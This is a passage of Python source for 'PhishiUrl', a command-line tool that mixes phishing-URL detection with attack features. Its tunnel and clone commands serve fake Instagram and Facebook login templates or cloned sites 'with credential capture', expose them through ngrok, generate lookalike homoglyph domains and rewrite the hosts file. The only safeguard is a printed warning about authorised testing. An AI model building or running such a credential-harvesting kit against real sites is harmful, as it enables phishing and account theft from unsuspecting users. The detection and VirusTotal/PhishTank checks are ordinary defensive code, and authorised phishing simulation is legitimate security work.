██║     ██║  ██║██║███████║██║  ██║██║╚██████╔╝██║  ██║███████╗ ██║██████╔╝██║ ╚██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═╝╚═════╝ ╚═╝  ╚╝
"""

def display_banner() -> None:
    console.print(f"[bold green]{BANNER}[/bold green]")
    console.print(
        f"  Tool: [cyan]{TOOL_NAME}[/cyan]  |  "
        f"Author: [cyan]{AUTHOR_NAME}[/cyan]  |  "
        f"Version: [cyan]{VERSION_NUM}[/cyan]  |  "
        f"GitHub: [cyan]{GITHUB_URL}[/cyan]\n"
    )

# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────
@click.group()
def cli():
    """PhishiUrl – Phishing Detection & Simulation Tool (v1.3.0)"""

@cli.command()
@click.option('--url',    help='Single URL to analyse')
@click.option('--file',   type=click.Path(exists=True), help='File with one URL per line')
@click.option('--output', help='Save results to this JSON file')
def check(url, file, output):
    """Analyse URL(s) for phishing indicators."""
    display_banner()
    detector = PhishingDetector()
    results  = []

    URL_RE = re.compile(r'^(https?://)?([^\s/]+)([/\S]*)?$')

    def process(u):
        u = u.strip()
        if URL_RE.match(u):
            results.append(detector.detect(u))
        else:
            console.print(f"[yellow]Skipping invalid URL: {u}[/yellow]")

    if url:
        process(url)
    elif file:
        # PowerShell 'echo' creates UTF-16 LE with BOM - detect automatically
        with open(file, 'rb') as fb:
            raw = fb.read()
        if raw.startswith(b'\xff\xfe'):
            content_str = raw.decode('utf-16-le', errors='replace').lstrip('\ufeff')
        elif raw.startswith(b'\xfe\xff'):
            content_str = raw.decode('utf-16-be', errors='replace').lstrip('\ufeff')
        elif raw.startswith(b'\xef\xbb\xbf'):
            content_str = raw.decode('utf-8-sig', errors='replace')
        else:
            content_str = raw.decode('utf-8', errors='replace')
        for line in content_str.splitlines():
            if line.strip():
                process(line)
    else:
        console.print("[red]Provide --url or --file[/red]")
        return

    generate_report(results)
    if output:
        with open(output, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        console.print(f"[green]Results saved → {output}[/green]")

@cli.command()
@click.option('--port',     default=8080,                     help='Local port')
@click.option('--template', default='instagram_login.html',   help='HTML template filename')
@click.option('--use-ngrok', is_flag=True,                    help='Expose via ngrok')
def tunnel(port, template, use_ngrok):
    """Start a web server (optionally with ngrok tunnel)."""
    display_banner()
    ngrok_url = start_ngrok(port) if use_ngrok else ''
    start_web_server(port, template=template, ngrok_address=ngrok_url)

@cli.command()
@click.option('--domain',             required=True, help='Domain to generate homoglyphs for')
@click.option('--output',                            help='Save results to file')
@click.option('--check-connection',  is_flag=True,  help='Ping each generated domain')
@click.option('--check-availability',is_flag=True,  help='WHOIS check each domain')
def suggest(domain, output, check_connection, check_availability):
    """Generate homoglyph lookalike domains."""
    display_banner()
    tld    = '.' + '.'.join(domain.split('.')[1:]) if '.' in domain else ''
    base   = domain.split('.')[0]
    generate_phishing_urls(base, tld, check_connection, output or '', check_availability)

@cli.command('api_check')
@click.option('--url',     required=True, help='URL to check')
@click.option('--service', default='virustotal',
              type=click.Choice(['virustotal', 'phishtank']),
              help='Which API to use')
def api_check(url, service):
    """Check a URL against VirusTotal or PhishTank."""
    display_banner()
    cfg = load_config()
    if service == 'virustotal':
        result = check_virustotal(url, cfg.get('virustotal_api_key', ''))
    else:
        result = check_phishtank(url, cfg.get('phishtank_api_key', ''))
    console.print_json(json.dumps(result, indent=2))

@cli.command()
@click.option('--url',          help='Target URL to clone')
@click.option('--port',         default=8080, help='Local server port')
@click.option('--use-ngrok',    is_flag=True, help='Expose via ngrok')
@click.option('--local-folder', type=click.Path(file_okay=False), help='Use local files instead')
@click.option('--download-js',  is_flag=True, help='Download JS files')
@click.option('--download-all', is_flag=True, help='Download all assets')
@click.option('--use-iframe',   is_flag=True, help='Iframe mode instead of clone')
def clone(url, port, use_ngrok, local_folder, download_js, download_all, use_iframe):
    """Clone a website and serve it with credential capture."""
    display_banner()
    console.print("[yellow]⚠ For authorised penetration testing ONLY.[/yellow]\n")

    # Determine cloning source
    use_local = bool(local_folder)
    if not use_local and not url and not use_iframe:
        console.print("[red]Provide --url, --local-folder, or --use-iframe[/red]")
        return

    # Derive save name from domain or folder
    if url:
        m = re.match(r'(?:https?://)?([^/?#]+)', url)
        domain   = m.group(1) if m else 'target'
        save_name = re.sub(r'[^\w.-]', '_', domain)
    elif local_folder:
        domain    = click.prompt("Domain for homoglyph generation (e.g. example.com)")
        save_name = re.sub(r'[^\w.-]', '_', domain)
    else:
        domain    = re.match(r'(?:https?://)?([^/?#]+)', url or 'target').group(1)
        save_name = re.sub(r'[^\w.-]', '_', domain)

    # Homoglyph suggestion (non-blocking – just informational)
    if not use_iframe:
        suggestions = generate_homoglyph_suggestions(domain, check_availability=False)
        if len(suggestions) > 1:
            console.print(f"[cyan]Example homoglyph: {suggestions[1]['domain']}[/cyan]")

    # Clone
    clone_dir = clone_website(
        url          = url or '',
        save_name    = save_name,
        use_local    = use_local,
        local_folder = local_folder or '',
        download_js  = download_js,
        download_all = download_all,
        use_iframe   = use_iframe,
    )
    if not clone_dir:
        return

    # Optional hosts file
    local_address = ''
    if url and not use_iframe:
        m = re.match(r'(?:https?://)?([^/?#]+)', url)
        if m:
            d = m.group(1)
            suggestions = generate_homoglyph_suggestions(d, check_availability=False)
            hg = next((s['domain'] for s in suggestions if s['domain'] != d), d)
            if modify_hosts_file(hg):
                local_address = f"http://{hg}:{port}"
            else:
                local_address = f"http://localhost:{port}"

    # Start server
    ngrok_address = start_ngrok(port) if use_ngrok else ''
    start_web_server(
        port,
        clone_dir     = clone_dir,
        template      = 'index.html',
        local_address = local_address,
        ngrok_address = ngrok_address,
    )

@cli.command('help')
def help_cmd():
    """Show usage examples."""
    display_banner()
    console.print(Panel("""
[bold]Commands[/bold]

  [cyan]check[/cyan]      Analyse URLs for phishing
  [cyan]tunnel[/cyan]     Serve a phishing template with optional ngrok
  [cyan]suggest[/cyan]    Generate homoglyph lookalike domains
  [cyan]api_check[/cyan]  Check a URL with VirusTotal / PhishTank
  [cyan]clone[/cyan]      Clone a website and serve with credential capture
  [cyan]help[/cyan]       Show this message

[bold]Examples[/bold]

  phishiurl check --url faceb00k.com
  phishiurl check --file urls.txt --output results.json
  phishiurl tunnel --port 8080 --template facebook_login.html --use-ngrok
  phishiurl suggest --domain google.com --check-availability
  phishiurl api_check --url faceb00k.com --service virustotal
  phishiurl clone --url https://example.com/login --port 8080 --download-js --download-all
  phishiurl clone --url https://example.com/login --port 8080 --use-iframe --use-ngrok
  phishiurl clone --local-folder ./my_site --port 8080
""", title="PhishiUrl Help"))

if __name__ == '__main__':
    cli()
